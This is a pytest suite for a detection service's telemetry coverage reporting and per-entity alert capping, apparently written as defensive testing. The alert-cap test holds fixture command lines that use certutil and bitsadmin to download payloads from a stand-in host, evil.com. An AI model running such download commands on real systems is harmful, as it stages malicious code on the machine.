"""Test suite for Defect 8: Detection coverage honesty:
1. Per-rule telemetry requirements declared on RULE_META and exposed in /rules/meta.
2. 'Not evaluable' state surfaced when a run lacks required telemetry categories.
3. Alert cap always keeps the first alert for each entity, even after rule cap is reached.
"""

from app.services.risk import RULE_META

from .conftest import make_run


def test_rule_meta_declares_required_telemetry(client):
    """Every rule in RULE_META must declare required telemetry categories."""
    for rid, meta in RULE_META.items():
        assert "required_telemetry" in meta, f"Rule {rid} is missing required_telemetry"
        assert isinstance(meta["required_telemetry"], list)
        assert len(meta["required_telemetry"]) > 0, f"Rule {rid} has empty required_telemetry"

    # API endpoint must expose required_telemetry
    resp = client.get("/rules/meta")
    assert resp.status_code == 200
    data = resp.json()
    for item in data:
        assert "required_telemetry" in item


def test_coverage_not_evaluable_state_for_missing_telemetry(client):
    """A run lacking required telemetry categories marks corresponding rules as not_evaluable."""
    run_id = make_run(client, platform="windows")

    # Ingest ONLY process events
    events = [
        {
            "run_id": run_id,
            "platform": "windows",
            "event_type": "process_create",
            "timestamp": "2026-08-01T10:00:00Z",
            "pid": 100,
            "ppid": 4,
            "process_name": "cmd.exe",
            "command_line": "cmd.exe /c dir",
        }
    ]
    res = client.post("/ingest/batch", json=events)
    assert res.status_code == 202

    # Query run coverage endpoint
    cov_res = client.get(f"/runs/{run_id}/coverage")
    assert cov_res.status_code == 200
    cov = cov_res.json()

    assert "present_telemetry" in cov
    assert "process" in cov["present_telemetry"]
    assert "network" not in cov["present_telemetry"]

    statuses = cov["rule_statuses"]
    # Process rule must be evaluable
    assert statuses["lolbin-abuse"]["status"] == "evaluable"
    assert statuses["lolbin-abuse"]["evaluable"] is True

    # Network / DNS rule must be not_evaluable
    assert statuses["beaconing"]["status"] == "not_evaluable"
    assert statuses["beaconing"]["evaluable"] is False
    assert "network" in statuses["beaconing"]["missing_telemetry"]

    assert statuses["dns-tunneling"]["status"] == "not_evaluable"
    assert statuses["dns-tunneling"]["evaluable"] is False


def test_coverage_evaluable_derived_from_collector_sensor_health_even_without_events(client):
    """When a host's collector reports healthy file/network sensor capabilities, rules requiring those
    telemetries are marked 'evaluable', even if the specific quiet run contains zero file events."""
    from app.core.db import db_session

    run_id = make_run(client, platform="linux")
    host_id = "collector-host-01"

    # Enrol collector host with healthy execution and file telemetry in agent_heartbeats
    with db_session() as conn:
        conn.execute(
            """
            INSERT INTO agent_heartbeats (host_id, last_heartbeat, platform, version, source_health_json)
            VALUES (?, '2026-08-01T12:00:00Z', 'linux', '1.0.0', ?)
            ON CONFLICT(host_id) DO UPDATE SET source_health_json = excluded.source_health_json
            """,
            (
                host_id,
                '{"execution": "healthy", "file": "healthy", "network": "absent", "dns": "absent"}',
            ),
        )

    # Ingest ONLY process events for this host (zero file events in the run)
    events = [
        {
            "run_id": run_id,
            "platform": "linux",
            "event_type": "process_create",
            "timestamp": "2026-08-01T12:00:01Z",
            "pid": 100,
            "ppid": 1,
            "process_name": "bash",
            "host_id": host_id,
        }
    ]
    res = client.post("/ingest/batch", json=events)
    assert res.status_code == 202

    # Query run coverage endpoint
    cov_res = client.get(f"/runs/{run_id}/coverage")
    assert cov_res.status_code == 200
    cov = cov_res.json()

    assert "file" in cov["collector_capabilities"]
    assert "file" in cov["present_telemetry"]
    statuses = cov["rule_statuses"]

    # File rule must be evaluable based on collector capability, despite 0 file events
    assert statuses["rename-burst"]["status"] == "evaluable"
    assert statuses["rename-burst"]["evaluable"] is True

    # Network / DNS rule must be not_evaluable because collector source_health is 'absent' and 0 network events
    assert statuses["beaconing"]["status"] == "not_evaluable"
    assert statuses["beaconing"]["evaluable"] is False
    assert "network" in statuses["beaconing"]["missing_telemetry"]


def test_alert_cap_preserves_first_alert_for_distinct_entities(client):
    """When a rule hits its alert cap, the FIRST alert for a new entity is still preserved, and repeat occurrences update the first alert."""
    run_id = make_run(client, platform="windows")

    # Set default rule cap to 2
    client.put("/rules/tuning/ALERT_CAP_DEFAULT", json={"value": "2"})
    try:
        # Entity 1 (PID 100): Triggers lolbin-abuse
        ev1 = {
            "run_id": run_id,
            "platform": "windows",
            "event_type": "process_create",
            "timestamp": "2026-08-01T10:00:00Z",
            "pid": 100,
            "ppid": 4,
            "process_name": "certutil.exe",
            "command_line": "certutil -urlcache -split -f http://evil.com/payload.exe",
            "host_id": "host-1",
            "process_start_time": "2026-08-01T10:00:00Z",
        }
        client.post("/ingest/batch", json=[ev1])

        alerts1 = client.get(f"/runs/{run_id}/alerts").json()
        lolbin_alerts1 = [a for a in alerts1 if a["rule_id"] == "lolbin-abuse"]
        assert len(lolbin_alerts1) == 1
        orig_alert_id = lolbin_alerts1[0]["id"]
        assert lolbin_alerts1[0]["occurrence_count"] == 1

        # Entity 1 again: Repeat trigger from the same process entity must dedupe into the first alert
        ev1_again = {
            "run_id": run_id,
            "platform": "windows",
            "event_type": "process_create",
            "timestamp": "2026-08-01T10:00:05Z",
            "pid": 100,
            "ppid": 4,
            "process_name": "certutil.exe",
            "command_line": "certutil -decode evil.b64 evil.exe",
            "host_id": "host-1",
            "process_start_time": "2026-08-01T10:00:00Z",
        }
        client.post("/ingest/batch", json=[ev1_again])
        alerts1_rep = client.get(f"/runs/{run_id}/alerts").json()
        lolbin_rep = [a for a in alerts1_rep if a["rule_id"] == "lolbin-abuse"]
        # Does NOT create a second alert for Entity 1 — preserves the first alert!
        assert len(lolbin_rep) == 1
        assert lolbin_rep[0]["id"] == orig_alert_id
        assert lolbin_rep[0]["occurrence_count"] == 2

        # Entity 2 (PID 200): Creates its first alert (cap=2)
        ev2 = {
            "run_id": run_id,
            "platform": "windows",
            "event_type": "process_create",
            "timestamp": "2026-08-01T10:01:00Z",
            "pid": 200,
            "ppid": 4,
            "process_name": "bitsadmin.exe",
            "command_line": "bitsadmin /transfer job http://evil.com/p.exe C:\\p.exe",
            "host_id": "host-1",
            "process_start_time": "2026-08-01T10:01:00Z",
        }
        client.post("/ingest/batch", json=[ev2])

        alerts2 = client.get(f"/runs/{run_id}/alerts").json()
        lolbin_alerts2 = [a for a in alerts2 if a["rule_id"] == "lolbin-abuse"]
        assert len(lolbin_alerts2) == 2

        # Entity 3 (PID 300): Cap is 2, so Entity 3 is capped/suppressed
        ev3 = {
            "run_id": run_id,
            "platform": "windows",
            "event_type": "process_create",
            "timestamp": "2026-08-01T10:02:00Z",
            "pid": 300,
            "ppid": 4,
            "process_name": "certutil.exe",
            "command_line": "certutil -urlcache evil.bin",
            "host_id": "host-1",
            "process_start_time": "2026-08-01T10:02:00Z",
        }
        client.post("/ingest/batch", json=[ev3])

        run_detail = client.get(f"/runs/{run_id}").json()
        assert run_detail["suppressed_alerts"].get("lolbin-abuse") == 1
        # Both Entity 1 and Entity 2 keep their first alerts!
        final_alerts = client.get(f"/runs/{run_id}/alerts").json()
        final_lolbins = [a for a in final_alerts if a["rule_id"] == "lolbin-abuse"]
        assert len(final_lolbins) == 2
        pids = {a["related_pid"] for a in final_lolbins}
        assert 100 in pids
        assert 200 in pids
    finally:
        client.delete("/rules/tuning/ALERT_CAP_DEFAULT")
